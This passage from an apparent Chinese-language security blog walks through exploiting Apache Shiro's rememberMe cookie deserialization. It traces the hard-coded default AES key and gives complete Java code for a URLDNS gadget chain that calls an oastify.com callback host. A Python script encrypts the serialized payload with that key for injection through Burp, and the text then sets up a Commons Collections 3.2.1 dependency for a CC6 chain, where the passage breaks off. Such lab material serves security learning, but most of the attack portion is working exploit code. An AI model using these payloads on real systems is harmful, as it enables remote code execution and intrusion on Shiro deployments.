+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] serialized </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> encrypted</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">CipherService</span><span style="color: #E06C75"> cipherService </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getCipherService</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (cipherService </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">ByteSource</span><span style="color: #E06C75"> byteSource </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">cipherService</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decrypt</span><span style="color: #ABB2BF">(encrypted, </span><span style="color: #61AFEF">getDecryptionCipherKey</span><span style="color: #ABB2BF">());</span><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//前面是获取字段你，后面是key</span></span>
+<span class="line"><span style="color: #E06C75">        serialized </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">byteSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getBytes</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> serialized</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208204428608.png" srcset="/img/loading.gif" lazyload alt="image-20251208204428572"></p>
+<p>使用key解密（获得key即可自主构造这个包）</p>
+</li>
+<li><p>查看<code>getDecryptionCipherKey()</code>对于key</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] </span><span style="color: #61AFEF">getDecryptionCipherKey</span><span style="color: #E06C75">() {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> decryptionCipherKey</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] decryptionCipherKey</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure>
+
+<p>发现最终的<code>decryptionCipherKey</code>是个常数</p>
+</li>
+<li><p>查看他的写入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208204851761.png" srcset="/img/loading.gif" lazyload alt="image-20251208204851702"></p>
+<p>是通过<code>setDecryptionCipherKey</code>这个函数</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">setDecryptionCipherKey</span><span style="color: #E06C75">(</span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] decryptionCipherKey) {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">decryptionCipherKey</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> decryptionCipherKey</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+</li>
+<li><p>一步步查看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208205025126.png" srcset="/img/loading.gif" lazyload alt="image-20251208205025070"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208205048022.png" srcset="/img/loading.gif" lazyload alt="image-20251208205047967"></p>
+</li>
+<li><p>最后：有一个固定值</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">final</span><span style="color: #E06C75"> </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] DEFAULT_CIPHER_KEY_BYTES </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Base64</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208205222240.png" srcset="/img/loading.gif" lazyload alt="image-20251208205222197"></p>
+<p><strong>这里的加解密函数就是AES解密</strong></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><blockquote>
+<p>构造序列化payload</p>
+<p>使用AES的固定key加密</p>
+<p>再base64加密</p>
+<p>调用反序列化</p>
+</blockquote>
+<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>由于shiro有cc依赖，但是在代码中没有import，所以cc的依赖没有办法打</p>
+<p>我们先来验证一下自己的URLDNS链子</p>
+<ol>
+<li><p>起一个bp</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210124308886.png" srcset="/img/loading.gif" lazyload alt="image-20251210124308776"></p>
+</li>
+<li><p>生成一个URLDNS链子的payload</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">org.example</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.*</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Field</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.net.URL</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.HashMap</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">UrlDNS</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">NoSuchFieldException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IllegalAccessException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">// Person person = new Person(&quot;xiao&quot;, 18, 01);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">hashmap</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//这里不想要发起请求，把url对象的hashcode改成不是-1就可以了</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">url</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">URL</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;http://n5tdih04a3c9dv0xgdhsebamqdw4ky8n.oastify.com&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">url</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">hashcodefield</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;hashCode&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">hashcodefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">hashcodefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(url, </span><span style="color: #D19A66">1234</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">hashmap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(url, </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span><span style="color: #7F848E; font-style: italic">//不改变的话在put的时候就已经调用hash,key的hashCode方法了，已经发送dns请求了</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//这里把hashCode改回-1</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//通过反射改变已有对象的属性</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">hashcodefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(url, </span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">serialize</span><span style="color: #ABB2BF">(hashmap);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//unserialize(&quot;ser.bin&quot;);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> serialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">obj</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectOutputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oos</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">oos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">writeObject</span><span style="color: #ABB2BF">(obj);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Object</span><span style="color: #61AFEF"> unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">Filename</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ois</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectInputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileInputStream</span><span style="color: #ABB2BF">(Filename));</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">obj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readObject</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> obj;</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+</li>
+<li><p>将<strong>序列化生成</strong>的bin和加密脚本放到一个文件夹中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251209205242557.png" srcset="/img/loading.gif" lazyload alt="image-20251209205242445"></p>
+</li>
+<li><p>加密脚本如下</p>
+<p><code>用脚本将ser.bin文件中序列化后的payloadAES加密base64编码</code></p>
+<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"></span>
+<span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> email.mime </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> base</span></span>
+<span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> pydoc </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> plain</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> sys</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> base64</span></span>
+<span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> turtle </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> mode</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> uuid</span></span>
+<span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> random </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> Random</span></span>
+<span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> Crypto.Cipher </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">AES</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">def</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">get_file_data</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66; font-style: italic">filename</span><span style="color: #ABB2BF">):</span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">with</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">open</span><span style="color: #ABB2BF">(filename, </span><span style="color: #98C379">&#39;rb&#39;</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">as</span><span style="color: #ABB2BF"> f:</span></span>
+<span class="line"><span style="color: #ABB2BF">    data </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> f.</span><span style="color: #61AFEF">read</span><span style="color: #ABB2BF">()</span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> data</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">def</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">aes_enc</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66; font-style: italic">data</span><span style="color: #ABB2BF">):</span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #D19A66">BS</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">AES</span><span style="color: #ABB2BF">.block_size</span></span>
+<span class="line"><span style="color: #ABB2BF"> pad </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">lambda</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66; font-style: italic">s</span><span style="color: #ABB2BF">: s </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> ((</span><span style="color: #D19A66">BS</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(s) </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">BS</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">chr</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">BS</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(s) </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">BS</span><span style="color: #ABB2BF">)).</span><span style="color: #61AFEF">encode</span><span style="color: #ABB2BF">()</span></span>
+<span class="line"><span style="color: #ABB2BF"> key </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span>
+<span class="line"><span style="color: #ABB2BF"> mode </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">AES</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">MODE_CBC</span></span>
+<span class="line"><span style="color: #ABB2BF"> iv </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> uuid.</span><span style="color: #61AFEF">uuid4</span><span style="color: #ABB2BF">().bytes</span></span>
+<span class="line"><span style="color: #ABB2BF"> encryptor </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">AES</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">new</span><span style="color: #ABB2BF">(base64.</span><span style="color: #61AFEF">b64decode</span><span style="color: #ABB2BF">(key), mode, iv)</span></span>
+<span class="line"><span style="color: #ABB2BF"> ciphertext </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> base64.</span><span style="color: #61AFEF">b64encode</span><span style="color: #ABB2BF">(iv </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> encryptor.</span><span style="color: #61AFEF">encrypt</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">pad</span><span style="color: #ABB2BF">(data)))</span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> ciphertext</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">def</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">aes_dec</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66; font-style: italic">enc_data</span><span style="color: #ABB2BF">):</span></span>
+<span class="line"><span style="color: #ABB2BF"> enc_data </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> base64.</span><span style="color: #61AFEF">b64decode</span><span style="color: #ABB2BF">(enc_data)</span></span>
+<span class="line"><span style="color: #ABB2BF"> unpad </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">lambda</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66; font-style: italic">s</span><span style="color: #ABB2BF">: s[:</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">s[</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">]]</span></span>
+<span class="line"><span style="color: #ABB2BF"> key </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span>
+<span class="line"><span style="color: #ABB2BF"> mode </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">AES</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">MODE_CBC</span></span>
+<span class="line"><span style="color: #ABB2BF"> iv </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> enc_data[:</span><span style="color: #D19A66">16</span><span style="color: #ABB2BF">]</span></span>
+<span class="line"><span style="color: #ABB2BF"> encryptor </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">AES</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">new</span><span style="color: #ABB2BF">(base64.</span><span style="color: #61AFEF">b64decode</span><span style="color: #ABB2BF">(key), mode, iv)</span></span>
+<span class="line"><span style="color: #ABB2BF"> plaintext </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> encryptor.</span><span style="color: #61AFEF">decrypt</span><span style="color: #ABB2BF">(enc_data[</span><span style="color: #D19A66">16</span><span style="color: #ABB2BF">:])</span></span>
+<span class="line"><span style="color: #ABB2BF"> plaintext </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">unpad</span><span style="color: #ABB2BF">(plaintext)</span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> plaintext</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">__name__</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;__main__&quot;</span><span style="color: #ABB2BF">:</span></span>
+<span class="line"><span style="color: #ABB2BF"> data </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">get_file_data</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">)</span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">aes_enc</span><span style="color: #ABB2BF">(data))</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210124210310.png" srcset="/img/loading.gif" lazyload alt="image-20251210124202931"></p>
+</li>
+<li><p>把这个贴到bp里面即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210124219723.png" srcset="/img/loading.gif" lazyload alt="image-20251210124219663"></p>
+<blockquote>
+<p>记得将JSESSIONID&#x3D;里面的内容删除，这也是身份验证</p>
+<p>先走JSESSIONID，如果它可以就不走rememberMe</p>
+</blockquote>
+</li>
+<li><p>成功（一定要是在提交包的时候出现DNS）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210124607818.png" srcset="/img/loading.gif" lazyload alt="image-20251210124607761"></p>
+</li>
+</ol>
+<h2 id="CC"><a href="#CC" class="headerlink" title="CC"></a>CC</h2><blockquote>
+<p>由于shiro不带cc依赖，所以我们可以在pom里面加一个cc依赖</p>
+</blockquote>
+<ul>
+<li><p>加3.2.1</p>
+<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;commons-collections&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;commons-collections&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;3.2.1&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">  &lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependencies</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>
+</li>
+<li><p>用cc6来打一下（生成的rememberMe）</p>
